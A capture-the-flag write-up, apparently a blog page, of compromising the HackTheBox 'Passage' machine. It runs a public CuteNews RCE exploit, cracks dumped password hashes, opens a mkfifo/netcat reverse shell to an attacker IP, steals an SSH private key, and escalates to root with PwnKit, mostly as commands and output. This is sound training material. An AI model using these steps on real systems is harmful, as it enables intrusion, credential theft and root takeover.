---
layout: page
title: Passage
description: CuteNews public exploit.
img: 
importance: 3
category: HackTheBox
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/passage/logo.png" title="HTB Passage Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Passage">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Let's see if we can't find the passage to the flags on Passage!

Start by running nmap to identify the services.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.206
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 20:51 AEST
Nmap scan report for 10.10.10.206
Host is up (0.44s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Passage News
|_http-server-header: Apache/2.4.18 (Ubuntu)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   430.62 ms 10.10.16.1
2   193.34 ms 10.10.10.206

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.63 seconds
```
{% endraw %}

<br />
Try running curl -I to pull the headers to try and identify some technologies.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ curl -I http://10.10.10.206
HTTP/1.1 200 OK
Date: Sat, 07 Jun 2025 10:55:10 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: CUTENEWS_SESSION=132n19st14im3mr8k7o0sa03o7; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```
{% endraw %}

<br />
Check the landing page the webserver is serving.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/passage/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try checking the source code of the web page.  We might get lucky and find something juicy.

{% raw %}
```html
<html>
<head>
    <title>Passage News</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	 <!-- **CSS - stylesheets** -->
	<link href="CuteNews/libs/css/cosmo.min.css" rel="stylesheet">
    <link href="CuteNews/libs/css/font-awesome.min.css" rel="stylesheet">

	<!-- **JS Javascripts** -->
    <script src="CuteNews/libs/js/jquery.js"></script>
    <script src="CuteNews/libs/js/bootstrap.min.js"></script>

    <script>
        window.onload = function() {
            var edt_comm_mode = document.getElementById('edt_comm_mode');
            if (edt_comm_mode != null) {
                window.scrollTo(0,9999);
            }
        }
    </script>

    <style>
        img { max-width: 100%; }
        td, th { vertical-align: top; padding: 5px; }
    </style>
</head>

<snip>

</html>
```
{% endraw %}

<br />
Check for the existence of robots.txt.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/passage/robots.png" title="Robots" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
From the links in the source code, check that CuteNews directory.  Notice the version at the bottom of the login form.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/passage/cutenews.png" title="CuteNews" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the exploit-db for CuteNews and our specific version.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/passage/exploitdb.png" title="Exploit-DB" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/48800">https://www.exploit-db.com/exploits/48800</a>

<br />
Download the exploit to the local working folder.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ wget https://www.exploit-db.com/raw/48800 -O exploit.py  
--2025-06-07 21:04:07--  https://www.exploit-db.com/raw/48800
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5117 (5.0K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   5.00K  --.-KB/s    in 0s      

2025-06-07 21:04:08 (124 MB/s) - ‘exploit.py’ saved [5117/5117]
```
{% endraw %}

<br />
Run the exploit and confirm execution.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ python3 exploit.py              
/home/kali/Documents/htb/passage/exploit.py:28: SyntaxWarning: invalid escape sequence '\_'
  \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/



           _____     __      _  __                     ___   ___  ___ 
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/ 
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/ 
                                ___  _________                        
                               / _ \/ ___/ __/                        
                              / , _/ /__/ _/                          
                             /_/|_|\___/___/                          
                                                                      

                                                                                                                                                   

[->] Usage python3 expoit.py

Enter the URL> http://10.10.10.206
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: 1iAdpCYI6A and password: 1iAdpCYI6A

=======================================================
Sending Payload
=======================================================
signature_key: 482ff15acce50becdbf875c8f29b5c5d-1iAdpCYI6A
signature_dsi: 880ba802e91aa1353a43af451effccc7
logged in user: 1iAdpCYI6A
============================
Dropping to a SHELL
============================

command > ls
avatar_1iAdpCYI6A_1iAdpCYI6A.php
avatar_egre55_ykxnacpt.php
avatar_hacker_jpyoyskt.php
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ sudo rlwrap nc -nlvp 443
listening on [any] 443 ...
```
{% endraw %}

<br />
Save the hashes to a file.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ cat passes.txt              
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
```
{% endraw %}

<br />
Run the hashes through the john the ripper.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt passes.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
atlanta1         (?)     
1g 0:00:00:01 DONE (2025-06-07 21:10) 0.7751g/s 11118Kp/s 11118Kc/s 44526KC/s -sevim-..*7¡Vamos!
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```
{% endraw %}

<br />
Check the rest of the hashes in crackstation.net to see if we can't get any other cracks.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/passage/crackstation.png" title="Crackstation" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://crackstation.net/">https://crackstation.net/</a>

<br />
Use Revshells to generate a payload.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/passage/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">https://www.revshells.com/</a>

<br />
Use the payload from revshells in the exploit command prompt.

{% raw %}
```bash
command > ls
avatar_1iAdpCYI6A_1iAdpCYI6A.php
avatar_egre55_ykxnacpt.php
avatar_hacker_jpyoyskt.php

command > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.5 443 >/tmp/f
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ sudo rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.206] 39494
bash: cannot set terminal process group (1641): Inappropriate ioctl for device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$
```
{% endraw %}

<br />
Check the /home folder to see who are the users on the system.

{% raw %}
```bash
www-data@passage:/home$ ls
ls
nadav  paul
```
{% endraw %}

<br />
Su into the paul account with the atlanta1 password from the john the ripper output.

{% raw %}
```bash
www-data@passage:/home$ su paul
su paul
Password: atlanta1

paul@passage:/home$
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
paul@passage:~$ cat user.txt
cat user.txt
<redacted>
paul@passage:~$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:1b:f2 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.206/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:1bf2/64 scope global mngtmpaddr dynamic 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:fe95:1bf2/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Check for the id_rsa private key.

{% raw %}
```bash
paul@passage:~/.ssh$ cat id_rsa
cat id_rsa

<redacted>
```
{% endraw %}

<br />
Transfer the private key to the attack machine and chmod the file to 600.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ cat id_rsa       
<redacted>
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ chmod 600 id_rsa
```
{% endraw %}

<br />
Ssh with the id_rsa file to ssh in as Paul.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ ssh -i id_rsa paul@10.10.10.206
paul@passage:~$
```
{% endraw %}

<br />
Run id to see more about the user.

{% raw %}
```bash
paul@passage:~$ id
uid=1001(paul) gid=1001(paul) groups=1001(paul)
```
{% endraw %}

<br />
Run sudo -l to list all of the commands our user can use as sudo.

{% raw %}
```bash
paul@passage:~$ sudo -l
[sudo] password for paul: 
Sorry, user paul may not run sudo on passage.
```
{% endraw %}

<br />
Run uname -a to get the Linux version.

{% raw %}
```bash
paul@passage:~$ uname -a
Linux passage 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
{% endraw %}

<br />
View the /etc/issue to get the OS version.

{% raw %}
```bash
paul@passage:~$ cat /etc/issue
Ubuntu 16.04.6 LTS \n \l
```
{% endraw %}

<br />
Check to running services.

{% raw %}
```bash
paul@passage:~$ ss -antlp
State      Recv-Q Send-Q                                                                         Local Address:Port                                                                                        Peer Address:Port              
LISTEN     0      128                                                                                        *:22                                                                                                     *:*                  
LISTEN     0      5                                                                                  127.0.0.1:631                                                                                                    *:*                  
LISTEN     0      128                                                                                       :::80                                                                                                    :::*                  
LISTEN     0      128                                                                                       :::22                                                                                                    :::*                  
LISTEN     0      5                                                                                        ::1:631                                                                                                   :::* 
```
{% endraw %}

<br />
So, since I noticed the fail2ban from the News front page.  So, I remembered that there was a privesc with this.  The conditions didn't appear to be vulnerable.  But that didn't stop me from spending time trying.  I am not including all of it though.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/passage/fail2ban.png" title="Fail2ban" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://juggernaut-sec.com/fail2ban-lpe/">https://juggernaut-sec.com/fail2ban-lpe/</a>

<br />
Download linpeas.sh from their GitHub.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/linpeas.sh
--2025-06-07 21:36:45--  https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/linpeas.sh
Resolving github.com (github.com)... 4.237.22.38
Connecting to github.com (github.com)|4.237.22.38|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/f8fabb35-84b0-4242-a012-781469300c05?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250607%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250607T113652Z&X-Amz-Expires=300&X-Amz-Signature=564ff79fe9af8b5fd967b263277133c658694ea0075c668291ca8bf0bbdd5e82&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-06-07 21:36:46--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/f8fabb35-84b0-4242-a012-781469300c05?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250607%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250607T113652Z&X-Amz-Expires=300&X-Amz-Signature=564ff79fe9af8b5fd967b263277133c658694ea0075c668291ca8bf0bbdd5e82&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 954437 (932K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 932.07K  2.97MB/s    in 0.3s    

2025-06-07 21:36:47 (2.97 MB/s) - ‘linpeas.sh’ saved [954437/954437]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Transfer to the victim machine.

{% raw %}
```bash
paul@passage:/dev/shm$ wget 10.10.16.5:8000/linpeas.sh
--2025-06-07 04:42:41--  http://10.10.16.5:8000/linpeas.sh
Connecting to 10.10.16.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 954437 (932K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 932.07K   349KB/s    in 2.7s    

2025-06-07 04:42:45 (349 KB/s) - ‘linpeas.sh’ saved [954437/954437]

paul@passage:/dev/shm$ chmod +x linpeas.sh
```
{% endraw %}

<br />
Run the peas and give the results peek.

{% raw %}
```bash
paul@passage:/dev/shm$ ./linpeas.sh 



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

<snip>

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                                                          
[+] [CVE-2021-4034] PwnKit                                                                                                                                                                                                                  

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

<snip>
```
{% endraw %}

<br />
Look up the PwnKit from the Linpeas because it says "Probably."

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/passage/pwnkit.png" title="PwnKit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/ly4k/PwnKit?tab=readme-ov-file">https://github.com/ly4k/PwnKit?tab=readme-ov-file</a>

<br />
Download the PwnKit to the attack machine.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/passage]
└─$ python3 -m http.server                                                        
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Transfer the script to the victim machine.

{% raw %}
```bash
paul@passage:/dev/shm$ wget 10.10.16.5:8000/PwnKit
--2025-06-07 07:06:13--  http://10.10.16.5:8000/PwnKit
Connecting to 10.10.16.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: ‘PwnKit’

PwnKit                                                     100%[========================================================================================================================================>]  17.62K  30.4KB/s    in 0.6s    

2025-06-07 07:06:14 (30.4 KB/s) - ‘PwnKit’ saved [18040/18040]

paul@passage:/dev/shm$ chmod +x PwnKit
```
{% endraw %}

<br />
Run the exploit script.

{% raw %}
```bash
paul@passage:/dev/shm$ ./PwnKit 
root@passage:/dev/shm# egre55
egre55: command not found
root@passage:/dev/shm#
```
{% endraw %}

<br />
Execute some commands to confirm command execution.

{% raw %}
```bash
root@passage:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root),1001(paul)
```
{% endraw %}

<br />
Be sure to snag the root.txt file.

{% raw %}
```bash
root@passage:/dev/shm# cat /root/root.txt
<snip>
root@passage:/dev/shm# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:1b:f2 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.206/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:1bf2/64 scope global mngtmpaddr dynamic 
       valid_lft 86397sec preferred_lft 14397sec
    inet6 fe80::250:56ff:fe95:1bf2/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
And with that, we successfully faced the flames at the end of the Passage.  Hopefully you enjoyed the read.  See you in the next one!